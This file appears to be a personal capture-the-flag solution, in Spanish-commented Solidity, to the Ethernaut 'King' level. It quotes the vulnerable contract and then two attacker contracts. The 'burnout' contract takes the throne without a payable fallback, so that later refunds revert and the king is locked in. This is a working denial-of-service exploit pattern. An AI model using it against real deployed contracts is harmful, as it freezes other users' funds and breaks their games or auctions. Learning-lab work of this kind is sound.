contract King is Ownable {

  // crea dos variables publicas que indican el actual rey y el premio acumulado
  address public king;
  uint public prize;

  // el contructor es publico y ademas pagable. El primero que lo llama es el rey y el premio es lo que le paso de eth
  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  // es una funcion fallback pagable que no se puede acceder desde el mismo contrato
  function() external payable {
  // requiere que el eth que mando es mayor o igual al premio O que el que lo envia es el mismo rey que antes
    require(msg.value >= prize || msg.sender == owner);
    // se envia el valor de eth que le paso al rey actual
    king.transfer(msg.value);
    // el rey actual es el nuevo que llama al contrato (puede ser el anterior rey)
    king = msg.sender;
    // el premio es el nuevo valor
    prize = msg.value;
  }
}

0xa58109a067f7768f515501c39c78d3e4cc4152f1

// es un ponzi porque para que continue, el nuevo paga al viejo algo mas que el anterior y espera que siempre haya uno que ponga mas que el anterior.

// Me pide que cuando quiere retornar el nivel, yo le tengo que impedir que cuando el (supongo que 

// el precio inicial es 1 eth. para verlo tengo que hacer desde la consola de remix
web3.fromWei(VALORDELPRIZE)




pragma solidity ^0.4.18;


contract rey {

  address public owner;
  //address public dir_yo = msg.sender;
  address public target;
  
  event seMando(address hacia, uint monto);

  function rey(address _reinadoAddress) public {
    owner = msg.sender;
  }
  
  function direccion(address _target) public {
      target = _target;
  }
  
  function mandar() public {
      target.transfer(1100000000000000000);
      //target.transfer(web3.toWei(1.01, "ether"));
      emit seMando(target, 1100000000000000000);
  }
  
  function destroy() { // so funds not locked in contract forever
        //suicide(target_add); // send funds to organizer
        suicide(owner);
  }
  
  function check_balance() public view returns (uint) {
      return this.balance;
  }
  
  function() public payable{
      
    }
  }
  
  
  // la cosa es que cada vez que uno manda mas al contrato, le devuelve al anterior lo que puso el nuevo
  // lo que tengo que hacer es que se produzca un error cuando uno le gana al otro, lo que produciria que no se completara el derrocamiento.
  
  //Para eso, se utiliza un contrato intermediario que no tenga una fallback payable para que le devuelvan la guita, y de esa forma se produce el error.
  
  
  pragma solidity ^0.4.18;

contract burnout {
    
    address public dir_yo = msg.sender;
    address public target = 0xA58109A067F7768F515501C39c78d3e4cC4152f1;
    event seMando(address hacia, uint monto);

    // guardo la direccion del target desde un input
    //function direccion(address _target) public {
    //    target = _target;
    //}
    
    function pagointermedio() public payable {
    }
    
    
    // ejecuto el envio hacia el target
    function mandar() public {
        //target.transfer(1000000000000000001);
        target.call.value(1000000000000000001)();
        emit seMando(target, 1000000000000000001);
    }
    
    // mato el mensajero
    function destroy() { 
        suicide(dir_yo);
    }
    
    function check_balance() public view returns (uint) {
      return this.balance;
    }
}
